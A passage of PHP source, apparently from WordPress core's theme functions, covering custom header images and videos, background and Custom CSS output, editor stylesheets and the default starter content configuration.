 * @since 3.4.0
 *
 * @return bool
 */
function display_header_text() {
	if ( ! current_theme_supports( 'custom-header', 'header-text' ) ) {
		return false;
	}

	$text_color = get_theme_mod( 'header_textcolor', get_theme_support( 'custom-header', 'default-text-color' ) );
	return 'blank' !== $text_color;
}

/**
 * Checks whether a header image is set or not.
 *
 * @since 4.2.0
 *
 * @see get_header_image()
 *
 * @return bool Whether a header image is set or not.
 */
function has_header_image() {
	return (bool) get_header_image();
}

/**
 * Retrieves header image for custom header.
 *
 * @since 2.1.0
 *
 * @return string|false
 */
function get_header_image() {
	$url = get_theme_mod( 'header_image', get_theme_support( 'custom-header', 'default-image' ) );

	if ( 'remove-header' === $url ) {
		return false;
	}

	if ( is_random_header_image() ) {
		$url = get_random_header_image();
	}

	/**
	 * Filters the header image URL.
	 *
	 * @since 6.1.0
	 *
	 * @param string $url Header image URL.
	 */
	$url = apply_filters( 'get_header_image', $url );

	if ( ! is_string( $url ) ) {
		return false;
	}

	$url = trim( $url );
	return sanitize_url( set_url_scheme( $url ) );
}

/**
 * Creates image tag markup for a custom header image.
 *
 * @since 4.4.0
 *
 * @param array $attr Optional. Additional attributes for the image tag. Can be used
 *                              to override the default attributes. Default empty.
 * @return string HTML image element markup or empty string on failure.
 */
function get_header_image_tag( $attr = array() ) {
	$header      = get_custom_header();
	$header->url = get_header_image();

	if ( ! $header->url ) {
		return '';
	}

	$width  = absint( $header->width );
	$height = absint( $header->height );
	$alt    = '';

	// Use alternative text assigned to the image, if available. Otherwise, leave it empty.
	if ( ! empty( $header->attachment_id ) ) {
		$image_alt = get_post_meta( $header->attachment_id, '_wp_attachment_image_alt', true );

		if ( is_string( $image_alt ) ) {
			$alt = $image_alt;
		}
	}

	$attr = wp_parse_args(
		$attr,
		array(
			'src'    => $header->url,
			'width'  => $width,
			'height' => $height,
			'alt'    => $alt,
		)
	);

	// Generate 'srcset' and 'sizes' if not already present.
	if ( empty( $attr['srcset'] ) && ! empty( $header->attachment_id ) ) {
		$image_meta = get_post_meta( $header->attachment_id, '_wp_attachment_metadata', true );
		$size_array = array( $width, $height );

		if ( is_array( $image_meta ) ) {
			$srcset = wp_calculate_image_srcset( $size_array, $header->url, $image_meta, $header->attachment_id );

			if ( ! empty( $attr['sizes'] ) ) {
				$sizes = $attr['sizes'];
			} else {
				$sizes = wp_calculate_image_sizes( $size_array, $header->url, $image_meta, $header->attachment_id );
			}

			if ( $srcset && $sizes ) {
				$attr['srcset'] = $srcset;
				$attr['sizes']  = $sizes;
			}
		}
	}

	$attr = array_merge(
		$attr,
		wp_get_loading_optimization_attributes( 'img', $attr, 'get_header_image_tag' )
	);

	/*
	 * If the default value of `lazy` for the `loading` attribute is overridden
	 * to omit the attribute for this image, ensure it is not included.
	 */
	if ( isset( $attr['loading'] ) && ! $attr['loading'] ) {
		unset( $attr['loading'] );
	}

	// If the `fetchpriority` attribute is overridden and set to false or an empty string.
	if ( isset( $attr['fetchpriority'] ) && ! $attr['fetchpriority'] ) {
		unset( $attr['fetchpriority'] );
	}

	// If the `decoding` attribute is overridden and set to false or an empty string.
	if ( isset( $attr['decoding'] ) && ! $attr['decoding'] ) {
		unset( $attr['decoding'] );
	}

	/**
	 * Filters the list of header image attributes.
	 *
	 * @since 5.9.0
	 *
	 * @param array  $attr   Array of the attributes for the image tag.
	 * @param object $header The custom header object returned by 'get_custom_header()'.
	 */
	$attr = apply_filters( 'get_header_image_tag_attributes', $attr, $header );

	$attr = array_map( 'esc_attr', $attr );
	$html = '<img';

	foreach ( $attr as $name => $value ) {
		$html .= ' ' . $name . '="' . $value . '"';
	}

	$html .= ' />';

	/**
	 * Filters the markup of header images.
	 *
	 * @since 4.4.0
	 *
	 * @param string $html   The HTML image tag markup being filtered.
	 * @param object $header The custom header object returned by 'get_custom_header()'.
	 * @param array  $attr   Array of the attributes for the image tag.
	 */
	return apply_filters( 'get_header_image_tag', $html, $header, $attr );
}

/**
 * Displays the image markup for a custom header image.
 *
 * @since 4.4.0
 *
 * @param array $attr Optional. Attributes for the image markup. Default empty.
 */
function the_header_image_tag( $attr = array() ) {
	echo get_header_image_tag( $attr );
}

/**
 * Gets random header image data from registered images in theme.
 *
 * @since 3.4.0
 *
 * @access private
 *
 * @global array $_wp_default_headers
 *
 * @return object
 */
function _get_random_header_data() {
	global $_wp_default_headers;
	static $_wp_random_header = null;

	if ( empty( $_wp_random_header ) ) {
		$header_image_mod = get_theme_mod( 'header_image', '' );
		$headers          = array();

		if ( 'random-uploaded-image' === $header_image_mod ) {
			$headers = get_uploaded_header_images();
		} elseif ( ! empty( $_wp_default_headers ) ) {
			if ( 'random-default-image' === $header_image_mod ) {
				$headers = $_wp_default_headers;
			} else {
				if ( current_theme_supports( 'custom-header', 'random-default' ) ) {
					$headers = $_wp_default_headers;
				}
			}
		}

		if ( empty( $headers ) ) {
			return new stdClass();
		}

		$_wp_random_header = (object) $headers[ array_rand( $headers ) ];

		$_wp_random_header->url = sprintf(
			$_wp_random_header->url,
			get_template_directory_uri(),
			get_stylesheet_directory_uri()
		);

		$_wp_random_header->thumbnail_url = sprintf(
			$_wp_random_header->thumbnail_url,
			get_template_directory_uri(),
			get_stylesheet_directory_uri()
		);
	}

	return $_wp_random_header;
}

/**
 * Gets random header image URL from registered images in theme.
 *
 * @since 3.2.0
 *
 * @return string Path to header image.
 */
function get_random_header_image() {
	$random_image = _get_random_header_data();

	if ( empty( $random_image->url ) ) {
		return '';
	}

	return $random_image->url;
}

/**
 * Checks if random header image is in use.
 *
 * Always true if user expressly chooses the option in Appearance > Header.
 * Also true if theme has multiple header images registered, no specific header image
 * is chosen, and theme turns on random headers with add_theme_support().
 *
 * @since 3.2.0
 *
 * @param string $type The random pool to use. Possible values include 'any',
 *                     'default', 'uploaded'. Default 'any'.
 * @return bool
 */
function is_random_header_image( $type = 'any' ) {
	$header_image_mod = get_theme_mod( 'header_image', get_theme_support( 'custom-header', 'default-image' ) );

	if ( 'any' === $type ) {
		if ( 'random-default-image' === $header_image_mod
			|| 'random-uploaded-image' === $header_image_mod
			|| ( empty( $header_image_mod ) && '' !== get_random_header_image() )
		) {
			return true;
		}
	} else {
		if ( "random-$type-image" === $header_image_mod ) {
			return true;
		} elseif ( 'default' === $type
			&& empty( $header_image_mod ) && '' !== get_random_header_image()
		) {
			return true;
		}
	}

	return false;
}

/**
 * Displays header image URL.
 *
 * @since 2.1.0
 */
function header_image() {
	$image = get_header_image();

	if ( $image ) {
		echo esc_url( $image );
	}
}

/**
 * Gets the header images uploaded for the active theme.
 *
 * @since 3.2.0
 *
 * @return array
 */
function get_uploaded_header_images() {
	$header_images = array();

	// @todo Caching.
	$headers = get_posts(
		array(
			'post_type'  => 'attachment',
			'meta_key'   => '_wp_attachment_is_custom_header',
			'meta_value' => get_option( 'stylesheet' ),
			'orderby'    => 'none',
			'nopaging'   => true,
		)
	);

	if ( empty( $headers ) ) {
		return array();
	}

	foreach ( (array) $headers as $header ) {
		$url          = sanitize_url( wp_get_attachment_url( $header->ID ) );
		$header_data  = wp_get_attachment_metadata( $header->ID );
		$header_index = $header->ID;

		$header_images[ $header_index ]                  = array();
		$header_images[ $header_index ]['attachment_id'] = $header->ID;
		$header_images[ $header_index ]['url']           = $url;
		$header_images[ $header_index ]['thumbnail_url'] = $url;
		$header_images[ $header_index ]['alt_text']      = get_post_meta( $header->ID, '_wp_attachment_image_alt', true );

		if ( isset( $header_data['attachment_parent'] ) ) {
			$header_images[ $header_index ]['attachment_parent'] = $header_data['attachment_parent'];
		} else {
			$header_images[ $header_index ]['attachment_parent'] = '';
		}

		if ( isset( $header_data['width'] ) ) {
			$header_images[ $header_index ]['width'] = $header_data['width'];
		}
		if ( isset( $header_data['height'] ) ) {
			$header_images[ $header_index ]['height'] = $header_data['height'];
		}
	}

	return $header_images;
}

/**
 * Gets the header image data.
 *
 * @since 3.4.0
 *
 * @global array $_wp_default_headers
 *
 * @return object
 */
function get_custom_header() {
	global $_wp_default_headers;

	if ( is_random_header_image() ) {
		$data = _get_random_header_data();
	} else {
		$data = get_theme_mod( 'header_image_data' );
		if ( ! $data && current_theme_supports( 'custom-header', 'default-image' ) ) {
			$directory_args        = array( get_template_directory_uri(), get_stylesheet_directory_uri() );
			$data                  = array();
			$data['url']           = vsprintf( get_theme_support( 'custom-header', 'default-image' ), $directory_args );
			$data['thumbnail_url'] = $data['url'];
			if ( ! empty( $_wp_default_headers ) ) {
				foreach ( (array) $_wp_default_headers as $default_header ) {
					$url = vsprintf( $default_header['url'], $directory_args );
					if ( $data['url'] === $url ) {
						$data                  = $default_header;
						$data['url']           = $url;
						$data['thumbnail_url'] = vsprintf( $data['thumbnail_url'], $directory_args );
						break;
					}
				}
			}
		}
	}

	$default = array(
		'url'           => '',
		'thumbnail_url' => '',
		'width'         => get_theme_support( 'custom-header', 'width' ),
		'height'        => get_theme_support( 'custom-header', 'height' ),
		'video'         => get_theme_support( 'custom-header', 'video' ),
	);
	return (object) wp_parse_args( $data, $default );
}

/**
 * Registers a selection of default headers to be displayed by the custom header admin UI.
 *
 * @since 3.0.0
 *
 * @global array $_wp_default_headers
 *
 * @param array $headers Array of headers keyed by a string ID. The IDs point to arrays
 *                       containing 'url', 'thumbnail_url', and 'description' keys.
 */
function register_default_headers( $headers ) {
	global $_wp_default_headers;

	$_wp_default_headers = array_merge( (array) $_wp_default_headers, (array) $headers );
}

/**
 * Unregisters default headers.
 *
 * This function must be called after register_default_headers() has already added the
 * header you want to remove.
 *
 * @see register_default_headers()
 * @since 3.0.0
 *
 * @global array $_wp_default_headers
 *
 * @param string|array $header The header string id (key of array) to remove, or an array thereof.
 * @return bool|void A single header returns true on success, false on failure.
 *                   There is currently no return value for multiple headers.
 */
function unregister_default_headers( $header ) {
	global $_wp_default_headers;

	if ( is_array( $header ) ) {
		array_map( 'unregister_default_headers', $header );
	} elseif ( isset( $_wp_default_headers[ $header ] ) ) {
		unset( $_wp_default_headers[ $header ] );
		return true;
	} else {
		return false;
	}
}

/**
 * Checks whether a header video is set or not.
 *
 * @since 4.7.0
 *
 * @see get_header_video_url()
 *
 * @return bool Whether a header video is set or not.
 */
function has_header_video() {
	return (bool) get_header_video_url();
}/**
 * Retrieves header video URL for custom header.
 *
 * Uses a local video if present, or falls back to an external video.
 *
 * @since 4.7.0
 *
 * @return string|false Header video URL or false if there is no video.
 */
function get_header_video_url() {
	$id = absint( get_theme_mod( 'header_video' ) );

	if ( $id ) {
		// Get the file URL from the attachment ID.
		$url = wp_get_attachment_url( $id );
	} else {
		$url = get_theme_mod( 'external_header_video' );
	}

	/**
	 * Filters the header video URL.
	 *
	 * @since 4.7.3
	 *
	 * @param string $url Header video URL, if available.
	 */
	$url = apply_filters( 'get_header_video_url', $url );

	if ( ! $id && ! $url ) {
		return false;
	}

	return sanitize_url( set_url_scheme( $url ) );
}

/**
 * Displays header video URL.
 *
 * @since 4.7.0
 */
function the_header_video_url() {
	$video = get_header_video_url();

	if ( $video ) {
		echo esc_url( $video );
	}
}

/**
 * Retrieves header video settings.
 *
 * @since 4.7.0
 *
 * @return array
 */
function get_header_video_settings() {
	$header     = get_custom_header();
	$video_url  = get_header_video_url();
	$video_type = wp_check_filetype( $video_url, wp_get_mime_types() );

	$settings = array(
		'mimeType'  => '',
		'posterUrl' => get_header_image(),
		'videoUrl'  => $video_url,
		'width'     => absint( $header->width ),
		'height'    => absint( $header->height ),
		'minWidth'  => 900,
		'minHeight' => 500,
		'l10n'      => array(
			'pause'      => __( 'Pause' ),
			'play'       => __( 'Play' ),
			'pauseSpeak' => __( 'Video is paused.' ),
			'playSpeak'  => __( 'Video is playing.' ),
		),
	);

	if ( preg_match( '#^https?://(?:www\.)?(?:youtube\.com/watch|youtu\.be/)#', $video_url ) ) {
		$settings['mimeType'] = 'video/x-youtube';
	} elseif ( ! empty( $video_type['type'] ) ) {
		$settings['mimeType'] = $video_type['type'];
	}

	/**
	 * Filters header video settings.
	 *
	 * @since 4.7.0
	 *
	 * @param array $settings An array of header video settings.
	 */
	return apply_filters( 'header_video_settings', $settings );
}

/**
 * Checks whether a custom header is set or not.
 *
 * @since 4.7.0
 *
 * @return bool True if a custom header is set. False if not.
 */
function has_custom_header() {
	if ( has_header_image() || ( has_header_video() && is_header_video_active() ) ) {
		return true;
	}

	return false;
}

/**
 * Checks whether the custom header video is eligible to show on the current page.
 *
 * @since 4.7.0
 *
 * @return bool True if the custom header video should be shown. False if not.
 */
function is_header_video_active() {
	if ( ! get_theme_support( 'custom-header', 'video' ) ) {
		return false;
	}

	$video_active_cb = get_theme_support( 'custom-header', 'video-active-callback' );

	if ( empty( $video_active_cb ) || ! is_callable( $video_active_cb ) ) {
		$show_video = true;
	} else {
		$show_video = call_user_func( $video_active_cb );
	}

	/**
	 * Filters whether the custom header video is eligible to show on the current page.
	 *
	 * @since 4.7.0
	 *
	 * @param bool $show_video Whether the custom header video should be shown. Returns the value
	 *                         of the theme setting for the `custom-header`'s `video-active-callback`.
	 *                         If no callback is set, the default value is that of `is_front_page()`.
	 */
	return apply_filters( 'is_header_video_active', $show_video );
}

/**
 * Retrieves the markup for a custom header.
 *
 * The container div will always be returned in the Customizer preview.
 *
 * @since 4.7.0
 *
 * @return string The markup for a custom header on success.
 */
function get_custom_header_markup() {
	if ( ! has_custom_header() && ! is_customize_preview() ) {
		return '';
	}

	return sprintf(
		'<div id="wp-custom-header" class="wp-custom-header">%s</div>',
		get_header_image_tag()
	);
}

/**
 * Prints the markup for a custom header.
 *
 * A container div will always be printed in the Customizer preview.
 *
 * @since 4.7.0
 */
function the_custom_header_markup() {
	$custom_header = get_custom_header_markup();
	if ( empty( $custom_header ) ) {
		return;
	}

	echo $custom_header;

	if ( is_header_video_active() && ( has_header_video() || is_customize_preview() ) ) {
		wp_enqueue_script( 'wp-custom-header' );
		wp_localize_script( 'wp-custom-header', '_wpCustomHeaderSettings', get_header_video_settings() );
	}
}

/**
 * Retrieves background image for custom background.
 *
 * @since 3.0.0
 *
 * @return string
 */
function get_background_image() {
	return get_theme_mod( 'background_image', get_theme_support( 'custom-background', 'default-image' ) );
}

/**
 * Displays background image path.
 *
 * @since 3.0.0
 */
function background_image() {
	echo get_background_image();
}

/**
 * Retrieves value for custom background color.
 *
 * @since 3.0.0
 *
 * @return string
 */
function get_background_color() {
	return get_theme_mod( 'background_color', get_theme_support( 'custom-background', 'default-color' ) );
}

/**
 * Displays background color value.
 *
 * @since 3.0.0
 */
function background_color() {
	echo get_background_color();
}

/**
 * Default custom background callback.
 *
 * @since 3.0.0
 */
function _custom_background_cb() {
	// $background is the saved custom image, or the default image.
	$background = set_url_scheme( get_background_image() );

	/*
	 * $color is the saved custom color.
	 * A default has to be specified in style.css. It will not be printed here.
	 */
	$color = get_background_color();

	if ( get_theme_support( 'custom-background', 'default-color' ) === $color ) {
		$color = false;
	}

	$type_attr = current_theme_supports( 'html5', 'style' ) ? '' : ' type="text/css"';

	if ( ! $background && ! $color ) {
		if ( is_customize_preview() ) {
			printf( '<style%s id="custom-background-css"></style>', $type_attr );
		}
		return;
	}

	$style = $color ? "background-color: #$color;" : '';

	if ( $background ) {
		$image = ' background-image: url("' . sanitize_url( $background ) . '");';

		// Background Position.
		$position_x = get_theme_mod( 'background_position_x', get_theme_support( 'custom-background', 'default-position-x' ) );
		$position_y = get_theme_mod( 'background_position_y', get_theme_support( 'custom-background', 'default-position-y' ) );

		if ( ! in_array( $position_x, array( 'left', 'center', 'right' ), true ) ) {
			$position_x = 'left';
		}

		if ( ! in_array( $position_y, array( 'top', 'center', 'bottom' ), true ) ) {
			$position_y = 'top';
		}

		$position = " background-position: $position_x $position_y;";

		// Background Size.
		$size = get_theme_mod( 'background_size', get_theme_support( 'custom-background', 'default-size' ) );

		if ( ! in_array( $size, array( 'auto', 'contain', 'cover' ), true ) ) {
			$size = 'auto';
		}

		$size = " background-size: $size;";

		// Background Repeat.
		$repeat = get_theme_mod( 'background_repeat', get_theme_support( 'custom-background', 'default-repeat' ) );

		if ( ! in_array( $repeat, array( 'repeat-x', 'repeat-y', 'repeat', 'no-repeat' ), true ) ) {
			$repeat = 'repeat';
		}

		$repeat = " background-repeat: $repeat;";

		// Background Scroll.
		$attachment = get_theme_mod( 'background_attachment', get_theme_support( 'custom-background', 'default-attachment' ) );

		if ( 'fixed' !== $attachment ) {
			$attachment = 'scroll';
		}

		$attachment = " background-attachment: $attachment;";

		$style .= $image . $position . $size . $repeat . $attachment;
	}
	?>
<style<?php echo $type_attr; ?> id="custom-background-css">
body.custom-background { <?php echo trim( $style ); ?> }
</style>
	<?php
}

/**
 * Renders the Custom CSS style element.
 *
 * @since 4.7.0
 */
function wp_custom_css_cb() {
	$styles = wp_get_custom_css();
	if ( $styles || is_customize_preview() ) :
		$type_attr = current_theme_supports( 'html5', 'style' ) ? '' : ' type="text/css"';
		?>
		<style<?php echo $type_attr; ?> id="wp-custom-css">
			<?php
			// Note that esc_html() cannot be used because `div &gt; span` is not interpreted properly.
			echo strip_tags( $styles );
			?>
		</style>
		<?php
	endif;
}

/**
 * Fetches the `custom_css` post for a given theme.
 *
 * @since 4.7.0
 *
 * @param string $stylesheet Optional. A theme object stylesheet name. Defaults to the active theme.
 * @return WP_Post|null The custom_css post or null if none exists.
 */
function wp_get_custom_css_post( $stylesheet = '' ) {
	if ( empty( $stylesheet ) ) {
		$stylesheet = get_stylesheet();
	}

	$custom_css_query_vars = array(
		'post_type'              => 'custom_css',
		'post_status'            => get_post_stati(),
		'name'                   => sanitize_title( $stylesheet ),
		'posts_per_page'         => 1,
		'no_found_rows'          => true,
		'cache_results'          => true,
		'update_post_meta_cache' => false,
		'update_post_term_cache' => false,
		'lazy_load_term_meta'    => false,
	);

	$post = null;
	if ( get_stylesheet() === $stylesheet ) {
		$post_id = get_theme_mod( 'custom_css_post_id' );

		if ( $post_id > 0 && get_post( $post_id ) ) {
			$post = get_post( $post_id );
		}

		// `-1` indicates no post exists; no query necessary.
		if ( ! $post && -1 !== $post_id ) {
			$query = new WP_Query( $custom_css_query_vars );
			$post  = $query->post;
			/*
			 * Cache the lookup. See wp_update_custom_css_post().
			 * @todo This should get cleared if a custom_css post is added/removed.
			 */
			set_theme_mod( 'custom_css_post_id', $post ? $post->ID : -1 );
		}
	} else {
		$query = new WP_Query( $custom_css_query_vars );
		$post  = $query->post;
	}

	return $post;
}

/**
 * Fetches the saved Custom CSS content for rendering.
 *
 * @since 4.7.0
 *
 * @param string $stylesheet Optional. A theme object stylesheet name. Defaults to the active theme.
 * @return string The Custom CSS Post content.
 */
function wp_get_custom_css( $stylesheet = '' ) {
	$css = '';

	if ( empty( $stylesheet ) ) {
		$stylesheet = get_stylesheet();
	}

	$post = wp_get_custom_css_post( $stylesheet );
	if ( $post ) {
		$css = $post->post_content;
	}

	/**
	 * Filters the custom CSS output into the head element.
	 *
	 * @since 4.7.0
	 *
	 * @param string $css        CSS pulled in from the Custom CSS post type.
	 * @param string $stylesheet The theme stylesheet name.
	 */
	$css = apply_filters( 'wp_get_custom_css', $css, $stylesheet );

	return $css;
}

/**
 * Updates the `custom_css` post for a given theme.
 *
 * Inserts a `custom_css` post when one doesn't yet exist.
 *
 * @since 4.7.0
 *
 * @param string $css CSS, stored in `post_content`.
 * @param array  $args {
 *     Args.
 *
 *     @type string $preprocessed Optional. Pre-processed CSS, stored in `post_content_filtered`.
 *                                Normally empty string.
 *     @type string $stylesheet   Optional. Stylesheet (child theme) to update.
 *                                Defaults to active theme/stylesheet.
 * }
 * @return WP_Post|WP_Error Post on success, error on failure.
 */
function wp_update_custom_css_post( $css, $args = array() ) {
	$args = wp_parse_args(
		$args,
		array(
			'preprocessed' => '',
			'stylesheet'   => get_stylesheet(),
		)
	);

	$data = array(
		'css'          => $css,
		'preprocessed' => $args['preprocessed'],
	);

	/**
	 * Filters the `css` (`post_content`) and `preprocessed` (`post_content_filtered`) args
	 * for a `custom_css` post being updated.
	 *
	 * This filter can be used by plugin that offer CSS pre-processors, to store the original
	 * pre-processed CSS in `post_content_filtered` and then store processed CSS in `post_content`.
	 * When used in this way, the `post_content_filtered` should be supplied as the setting value
	 * instead of `post_content` via a the `customize_value_custom_css` filter, for example:
	 *
	 * <code>
	 * add_filter( 'customize_value_custom_css', function( $value, $setting ) {
	 *     $post = wp_get_custom_css_post( $setting->stylesheet );
	 *     if ( $post && ! empty( $post->post_content_filtered ) ) {
	 *         $css = $post->post_content_filtered;
	 *     }
	 *     return $css;
	 * }, 10, 2 );
	 * </code>
	 *
	 * @since 4.7.0
	 * @param array $data {
	 *     Custom CSS data.
	 *
	 *     @type string $css          CSS stored in `post_content`.
	 *     @type string $preprocessed Pre-processed CSS stored in `post_content_filtered`.
	 *                                Normally empty string.
	 * }
	 * @param array $args {
	 *     The args passed into `wp_update_custom_css_post()` merged with defaults.
	 *
	 *     @type string $css          The original CSS passed in to be updated.
	 *     @type string $preprocessed The original preprocessed CSS passed in to be updated.
	 *     @type string $stylesheet   The stylesheet (theme) being updated.
	 * }
	 */
	$data = apply_filters( 'update_custom_css_data', $data, array_merge( $args, compact( 'css' ) ) );

	$post_data = array(
		'post_title'            => $args['stylesheet'],
		'post_name'             => sanitize_title( $args['stylesheet'] ),
		'post_type'             => 'custom_css',
		'post_status'           => 'publish',
		'post_content'          => $data['css'],
		'post_content_filtered' => $data['preprocessed'],
	);

	// Update post if it already exists, otherwise create a new one.
	$post = wp_get_custom_css_post( $args['stylesheet'] );
	if ( $post ) {
		$post_data['ID'] = $post->ID;
		$r               = wp_update_post( wp_slash( $post_data ), true );
	} else {
		$r = wp_insert_post( wp_slash( $post_data ), true );

		if ( ! is_wp_error( $r ) ) {
			if ( get_stylesheet() === $args['stylesheet'] ) {
				set_theme_mod( 'custom_css_post_id', $r );
			}

			// Trigger creation of a revision. This should be removed once #30854 is resolved.
			$revisions = wp_get_latest_revision_id_and_total_count( $r );
			if ( ! is_wp_error( $revisions ) && 0 === $revisions['count'] ) {
				wp_save_post_revision( $r );
			}
		}
	}

	if ( is_wp_error( $r ) ) {
		return $r;
	}
	return get_post( $r );
}

/**
 * Adds callback for custom TinyMCE editor stylesheets.
 *
 * The parameter $stylesheet is the name of the stylesheet, relative to
 * the theme root. It also accepts an array of stylesheets.
 * It is optional and defaults to 'editor-style.css'.
 *
 * This function automatically adds another stylesheet with -rtl prefix, e.g. editor-style-rtl.css.
 * If that file doesn't exist, it is removed before adding the stylesheet(s) to TinyMCE.
 * If an array of stylesheets is passed to add_editor_style(),
 * RTL is only added for the first stylesheet.
 *
 * Since version 3.4 the TinyMCE body has .rtl CSS class.
 * It is a better option to use that class and add any RTL styles to the main stylesheet.
 *
 * @since 3.0.0
 *
 * @global array $editor_styles
 *
 * @param array|string $stylesheet Optional. Stylesheet name or array thereof, relative to theme root.
 *                                 Defaults to 'editor-style.css'
 */
function add_editor_style( $stylesheet = 'editor-style.css' ) {
	global $editor_styles;

	add_theme_support( 'editor-style' );

	$editor_styles = (array) $editor_styles;
	$stylesheet    = (array) $stylesheet;

	if ( is_rtl() ) {
		$rtl_stylesheet = str_replace( '.css', '-rtl.css', $stylesheet[0] );
		$stylesheet[]   = $rtl_stylesheet;
	}

	$editor_styles = array_merge( $editor_styles, $stylesheet );
}

/**
 * Removes all visual editor stylesheets.
 *
 * @since 3.1.0
 *
 * @global array $editor_styles
 *
 * @return bool True on success, false if there were no stylesheets to remove.
 */
function remove_editor_styles() {
	if ( ! current_theme_supports( 'editor-style' ) ) {
		return false;
	}
	_remove_theme_support( 'editor-style' );
	if ( is_admin() ) {
		$GLOBALS['editor_styles'] = array();
	}
	return true;
}

/**
 * Retrieves any registered editor stylesheet URLs.
 *
 * @since 4.0.0
 *
 * @global array $editor_styles Registered editor stylesheets
 *
 * @return string[] If registered, a list of editor stylesheet URLs.
 */
function get_editor_stylesheets() {
	$stylesheets = array();
	// Load editor_style.css if the active theme supports it.
	if ( ! empty( $GLOBALS['editor_styles'] ) && is_array( $GLOBALS['editor_styles'] ) ) {
		$editor_styles = $GLOBALS['editor_styles'];

		$editor_styles = array_unique( array_filter( $editor_styles ) );
		$style_uri     = get_stylesheet_directory_uri();
		$style_dir     = get_stylesheet_directory();

		// Support externally referenced styles (like, say, fonts).
		foreach ( $editor_styles as $key => $file ) {
			if ( preg_match( '~^(https?:)?//~', $file ) ) {
				$stylesheets[] = sanitize_url( $file );
				unset( $editor_styles[ $key ] );
			}
		}

		// Look in a parent theme first, that way child theme CSS overrides.
		if ( is_child_theme() ) {
			$template_uri = get_template_directory_uri();
			$template_dir = get_template_directory();

			foreach ( $editor_styles as $key => $file ) {
				if ( $file && file_exists( "$template_dir/$file" ) ) {
					$stylesheets[] = "$template_uri/$file";
				}
			}
		}

		foreach ( $editor_styles as $file ) {
			if ( $file && file_exists( "$style_dir/$file" ) ) {
				$stylesheets[] = "$style_uri/$file";
			}
		}
	}

	/**
	 * Filters the array of URLs of stylesheets applied to the editor.
	 *
	 * @since 4.3.0
	 *
	 * @param string[] $stylesheets Array of URLs of stylesheets to be applied to the editor.
	 */
	return apply_filters( 'editor_stylesheets', $stylesheets );
}

/**
 * Expands a theme's starter content configuration using core-provided data.
 *
 * @since 4.7.0
 *
 * @return array Array of starter content.
 */
function get_theme_starter_content() {
	$theme_support = get_theme_support( 'starter-content' );
	if ( is_array( $theme_support ) && ! empty( $theme_support[0] ) && is_array( $theme_support[0] ) ) {
		$config = $theme_support[0];
	} else {
		$config = array();
	}

	$core_content = array(
		'widgets'   => array(
			'text_business_info' => array(
				'text',
				array(
					'title'  => _x( 'Find Us', 'Theme starter content' ),
					'text'   => implode(
						'',
						array(
							'<strong>' . _x( 'Address', 'Theme starter content' ) . "</strong>\n",
							_x( '123 Main Street', 'Theme starter content' ) . "\n",
							_x( 'New York, NY 10001', 'Theme starter content' ) . "\n\n",
							'<strong>' . _x( 'Hours', 'Theme starter content' ) . "</strong>\n",
							_x( 'Monday&ndash;Friday: 9:00AM&ndash;5:00PM', 'Theme starter content' ) . "\n",
							_x( 'Saturday &amp; Sunday: 11:00AM&ndash;3:00PM', 'Theme starter content' ),
						)
					),
					'filter' => true,
					'visual' => true,
				),
			),
			'text_about'         => array(
				'text',
				array(
					'title'  => _x( 'About This Site', 'Theme starter content' ),
					'text'   => _x( 'This may be a good place to introduce yourself and your site or include some credits.', 'Theme starter content' ),
					'filter' => true,
					'visual' => true,
				),
			),
			'archives'           => array(
				'archives',
				array(
					'title' => _x( 'Archives', 'Theme starter content' ),
				),
			),
			'calendar'           => array(
				'calendar',
				array(
					'title' => _x( 'Calendar', 'Theme starter content' ),
				),
			),
			'categories'         => array(
				'categories',
				array(
					'title' => _x( 'Categories', 'Theme starter content' ),
				),
			),
			'meta'               => array(
				'meta',
				array(
					'title' => _x( 'Meta', 'Theme starter content' ),
				),
			),
			'recent-comments'    => array(
				'recent-comments',
				array(
					'title' => _x( 'Recent Comments', 'Theme starter content' ),
				),
			),
			'recent-posts'       => array(
				'recent-posts',
				array(
					'title' => _x( 'Recent Posts', 'Theme starter content' ),
				),
			),
			'search'             => array(
				'search',
				array(
					'title' => _x( 'Search', 'Theme starter content' ),
				),
			),
		),
		'nav_menus' => array(
			'link_home'       => array(
				'type'  => 'custom',
				'title' => _x( 'Home', 'Theme starter content' ),
				'url'   => home_url( '/' ),
			),
			'page_home'       => array( // Deprecated in favor of 'link_home'.
				'type'      => 'post_type',
				'object'    => 'page',
				'object_id' => '{{home}}',
			),
			'page_about'      => array(
				'type'      => 'post_type',
				'object'    => 'page',
				'object_id' => '{{about}}',
			),
			'page_blog'       => array(
				'type'      => 'post_type',
				'object'    => 'page',
				'object_id' => '{{blog}}',
			),
			'page_news'       => array(
				'type'      => 'post_type',
				'object'    => 'page',
				'object_id' => '{{news}}',
			),
			'page_contact'    => array(
				'type'      => 'post_type',
				'object'    => 'page',
				'object_id' => '{{contact}}',
			),

			'link_email'      => array(
				'title' => _x( 'Email', 'Theme starter content' ),
				'url'   => 'mailto:wordpress@example.com',
			),
			'link_facebook'   => array(
				'title' => _x( 'Facebook', 'Theme starter content' ),
				'url'   => 'https://www.facebook.com/wordpress',
			),
			'link_foursquare' => array(
				'title' => _x( 'Foursquare', 'Theme starter content' ),
				'url'   => 'https://foursquare.com/',
			),
			'link_github'     => array(
				'title' => _x( 'GitHub', 'Theme starter content' ),
				'url'   => 'https://github.com/wordpress/',
			),
			'link_instagram'  => array(
				'title' => _x( 'Instagram', 'Theme starter content' ),
				'url'   => 'https://www.instagram.com/explore/tags/wordcamp/',
			),
			'link_linkedin'   => array(
				'title' => _x( 'LinkedIn', 'Theme starter content' ),
				'url'   => 'https://www.linkedin.com/company/1089783',
			),
			'link_pinterest'  => array(
				'title' => _x( 'Pinterest', 'Theme starter content' ),
				'url'   => 'https://www.pinterest.com/',
			),
			'link_twitter'    => array(
				'title' => _x( 'Twitter', 'Theme starter content' ),
				'url'   => 'https://twitter.com/wordpress',
			),
			'link_yelp'       => array(
				'title' => _x( 'Yelp', 'Theme starter content' ),
				'url'   => 'https://www.yelp.com',
			),
			'link_youtube'    => array(
				'title' => _x( 'YouTube', 'Theme starter content' ),
				'url'   => 'https://www.youtube.com/channel/UCdof4Ju7amm1chz1gi1T2ZA',
			),
		),
		'posts'     => array(
			'home'             => array(
				'post_type'    => 'page',
				'post_title'   => _x( 'Home', 'Theme starter content' ),
				'post_content' => sprintf(
					"<!-- wp:paragraph -->\n<p>%s</p>\n<!-- /wp:paragraph -->",
					_x( 'Welcome to your site! This is your homepage, which is what most visitors will see when they come to your site for the first time.', 'Theme starter content' )
				),
			),
			'about'            => array(
				'post_type'    => 'page',
				'post_title'   => _x( 'About', 'Theme starter content' ),
				'post_content' => sprintf(
